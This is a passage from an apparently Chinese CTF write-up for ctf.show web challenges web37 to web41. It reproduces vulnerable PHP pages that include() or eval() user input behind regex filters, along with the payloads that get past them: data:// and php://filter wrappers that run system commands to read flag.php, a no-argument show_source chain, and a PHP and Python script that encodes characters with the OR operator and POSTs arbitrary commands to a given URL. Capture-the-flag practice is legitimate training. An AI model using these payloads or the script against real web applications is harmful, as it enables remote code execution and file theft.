<p>url/?c=include$_GET[m]?&gt;&amp;m=php://filter/convert.base64-encode/resource=flag.php</p>
<p>或者</p>
<p>url/?c=include$_GET[m]?&gt;&amp;m=data://text/plain,<?php%20system("tac%20flag.php")?></p></blockquote>
<h4 id="web37">web37<a hidden class="anchor" aria-hidden="true" href="#web37">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 05:18:55
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1">//flag in flag.php
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>不是哥们，怎么还是文件包含</p>
<p>payload：</p>
<blockquote>
<p>?c=data://text/plain,<?php system("tac fla*.php")?></p>
<p>或者</p>
<p>?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</p></blockquote>
<h4 id="web38">web38<a hidden class="anchor" aria-hidden="true" href="#web38">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 05:23:36
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1">//flag in flag.php
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|php|file/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>payload:</p>
<blockquote>
<p>?c=data://text/plain,<?=system("tac%20fla*")?></p>
<p>或者</p>
<p>?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</p></blockquote>
<h4 id="web39">web39<a hidden class="anchor" aria-hidden="true" href="#web39">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 06:13:21
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1">//flag in flag.php
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这里会在我们传入的c后面拼接一段.php</p>
<p>我们只需要在加入<?php ?>那么php就只会执行中间的代码，后面的内容不会执行</p>
<p>故payload：</p>
<blockquote>
<p>?c=data://text/plain,<?php system("tac fla*.php")?></p></blockquote>
<h4 id="web40">web40<a hidden class="anchor" aria-hidden="true" href="#web40">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 06:03:36
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[0-9]|\~|\`|\@|\#|</span><span class="se">\\</span><span class="s2">$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\&#39;|</span><span class="se">\&#34;</span><span class="s2">|\,|\&lt;|\.|\&gt;|\/|\?|</span><span class="se">\\\\</span><span class="s2">/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>屏蔽关键词 /[0-9]|~|`|@|#|\$|%|^|&amp;|*|\（|\）|-|=|+|{|[|]|}|:|'|&quot;|,|&lt;|.|&gt;|/|?|\\</p>
<p>这里要使用无参命令执行</p>
<p>payload：</p>
<blockquote>
<p>?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</p></blockquote>
<p>关于无参命令执行的一些解释</p>
<p><img alt="image-20241109165447576" loading="lazy" src="../assets/202411091654772.png"></p>
<h4 id="web41">web41<a hidden class="anchor" aria-hidden="true" href="#web41">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: 羽
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:31:22
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:40:07
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: 1341963450@qq.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctf.show
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i&#39;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;echo(</span><span class="si">$c</span><span class="s2">);&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>过滤内容：<code>/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i</code></p>
<p>这个题过滤了<code>$、+、-、^、~</code>使得<strong>异或自增和取反</strong>构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或<a href="https://so.csdn.net/so/search?q=%e8%bf%90%e7%ae%97%e7%ac%a6&amp;spm=1001.2101.3001.7020">运算符</a><code>|</code>。
我们可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符。</p>
<p>大佬的脚本</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nv">$myfile</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;rce_or.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nv">$contents</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$j</span> <span class="o">&lt;</span><span class="mi">256</span> <span class="p">;</span> <span class="nv">$j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nv">$i</span><span class="o">&lt;</span><span class="mi">16</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">			<span class="nv">$hex_i</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="o">.</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">			<span class="nv">$hex_i</span><span class="o">=</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nv">$j</span><span class="o">&lt;</span><span class="mi">16</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">			<span class="nv">$hex_j</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="o">.</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$j</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">			<span class="nv">$hex_j</span><span class="o">=</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$j</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">		<span class="nv">$preg</span> <span class="o">=</span> <span class="s1">&#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$preg</span> <span class="p">,</span> <span class="nx">hex2bin</span><span class="p">(</span><span class="nv">$hex_i</span><span class="p">))</span><span class="o">||</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$preg</span> <span class="p">,</span> <span class="nx">hex2bin</span><span class="p">(</span><span class="nv">$hex_j</span><span class="p">))){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">					<span class="k">echo</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">  
</span></span><span class="line"><span class="ln">24</span><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">		<span class="nv">$a</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="o">.</span><span class="nv">$hex_i</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">		<span class="nv">$b</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="o">.</span><span class="nv">$hex_j</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">		<span class="nv">$c</span><span class="o">=</span><span class="p">(</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span><span class="o">|</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">)</span><span class="o">&gt;=</span><span class="mi">32</span><span class="o">&amp;</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">126</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">			<span class="nv">$contents</span><span class="o">=</span><span class="nv">$contents</span><span class="o">.</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &#34;</span><span class="o">.</span><span class="nv">$a</span><span class="o">.</span><span class="s2">&#34; &#34;</span><span class="o">.</span><span class="nv">$b</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="nx">fwrite</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">,</span><span class="nv">$contents</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl"><span class="nx">fclose</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">);</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="nn">urllib</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;php rce_or.php&#34;</span><span class="p">)</span>  <span class="c1">#没有将php写入环境变量需手动运行</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">argv</span><span class="p">)</span><span class="o">!=</span><span class="mi">2</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;USER：python exp.py &lt;url&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;eg：  python exp.py http://ctf.show/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">   <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="n">url</span><span class="o">=</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">def</span> <span class="nf">action</span><span class="p">(</span><span class="n">arg</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">   <span class="n">s1</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">   <span class="n">s2</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">   <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">arg</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">       <span class="n">f</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;rce_or.txt&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">       <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">           <span class="n">t</span><span class="o">=</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">           <span class="k">if</span> <span class="n">t</span><span class="o">==</span><span class="s2">&#34;&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">               <span class="k">break</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">           <span class="k">if</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="n">i</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">               <span class="c1">#print(i)</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">               <span class="n">s1</span><span class="o">+=</span><span class="n">t</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">5</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">               <span class="n">s2</span><span class="o">+=</span><span class="n">t</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">9</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">               <span class="k">break</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">       <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">   <span class="n">output</span><span class="o">=</span><span class="s2">&#34;(</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">s1</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">|</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">s2</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">)&#34;</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">   <span class="k">return</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">   
</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">   <span class="n">param</span><span class="o">=</span><span class="n">action</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[+] your function：&#34;</span><span class="p">)</span> <span class="p">)</span><span class="o">+</span><span class="n">action</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;[+] your command：&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">   <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">       <span class="s1">&#39;c&#39;</span><span class="p">:</span><span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">param</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">       <span class="p">}</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">   <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
